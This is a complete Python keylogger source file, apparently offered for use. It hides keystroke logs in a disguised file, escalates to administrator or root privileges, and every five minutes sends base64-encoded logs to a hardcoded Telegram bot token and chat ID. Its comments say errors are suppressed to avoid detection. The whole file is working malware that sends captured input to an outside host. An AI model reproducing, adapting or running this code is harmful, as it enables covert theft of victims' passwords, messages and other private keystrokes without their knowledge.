import os
import sys
import time
import threading
import shutil
import subprocess
import base64
import requests
from pynput import keyboard

# Configuration
LOG_FILE = os.path.expanduser("~/.syslog_update")  # Hidden log file
TELEGRAM_BOT_TOKEN = "8069850554:AAGSURqHKfiqB_SASH16r4r82Q7Yd86RLLc"  # Replace with your bot token
TELEGRAM_CHAT_ID = "1589606555"  # Replace with your chat ID
SEND_INTERVAL = 300  # Send logs every 5 minutes
SELF_DELETE = False  # Set to True to delete script after execution


# ====== AUTOMATIC PERMISSION ESCALATION ======
def elevate_privileges():
    """Automatically request admin/root privileges if not already elevated."""
    if os.name == "nt":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit()
        except Exception:
            pass  # Ignore errors if already running as admin
    else:
        if os.geteuid() != 0:
            print("[!] Re-running with sudo privileges...")
            os.execvp("sudo", ["sudo", "python3"] + sys.argv)


def send_to_telegram(message):
    """Sends logs to Telegram bot."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=data)
    except Exception:
        pass  # Ignore errors to avoid detection


def send_logs():
    """Sends logs to Telegram every few minutes."""
    while True:
        time.sleep(SEND_INTERVAL)
        try:
            with open(LOG_FILE, "r") as log_file:
                log_content = log_file.read()

            if log_content:
                encrypted_data = base64.b64encode(log_content.encode()).decode()
                send_to_telegram(f"🔹 *Keylogger Logs:* \n\n```{encrypted_data}```")
                open(LOG_FILE, "w").close()  # Clear logs after sending
        except Exception:
            pass  # Fail silently


def on_press(key):
    """Records keystrokes in a hidden encrypted log file."""
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(" ")  # Space
            else:
                log_file.write(f" [{key.name}] ")  # Special keys
    except Exception:
        pass  # Fail silently


def start_keylogger():
    """Starts the keylogger with Telegram logging."""
    print("[+] Keylogger started. Running in background.")

    # Elevate privileges automatically
    elevate_privileges()

    # Start Telegram log sending thread
    threading.Thread(target=send_logs, daemon=True).start()

    # Start keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    start_keylogger()
